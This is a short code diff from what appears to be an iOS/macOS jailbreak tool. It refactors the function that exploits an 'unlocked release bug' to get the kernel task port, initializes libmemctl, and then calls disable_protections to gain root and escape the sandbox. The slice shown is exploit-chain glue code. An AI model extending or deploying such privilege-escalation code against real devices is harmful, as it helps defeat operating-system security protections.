@@ -52,17 +52,15 @@ int jb_go() {
   printf("[+] got host priv port\n");
   
   // exploit the unlocked release bug to get the kernel task port:
-  uint64_t kernel_base = 0;
   uint64_t realhost = 0;
-  mach_port_t kernel_task_port = get_kernel_task_port(host_priv_port, &kernel_base, &realhost);
+  mach_port_t kernel_task_port = get_kernel_task_port(host_priv_port, &realhost);
   
   if (kernel_task_port == MACH_PORT_NULL) {
     printf("[-] failed to get kernel task port\n");
     exit(EXIT_FAILURE);
   }
-  
+
   printf("[+] got kernel task port!\n");
-  printf("[+] kernel is at 0x%llx\n", kernel_base);
 
   // Initialize libmemctl.
   kernel_task = kernel_task_port;
@@ -76,6 +74,7 @@ int jb_go() {
   assert(success);
   success = kernel_init(NULL);
   assert(success);
+  printf("[+] kernel is at 0x%llx\n", kernel.base);
   success = kernel_call_init();
   assert(success);
   kernel_memory_init();
@@ -83,7 +82,7 @@ int jb_go() {
   printf("[+] initialized libmemctl\n");
 
   // get root and leave the sandbox
-  disable_protections(kernel_base, realhost);
+  disable_protections(realhost);
   
   // make our host port the priv one - this won't persist across an exec
   // but we fix that in disable_protections() later
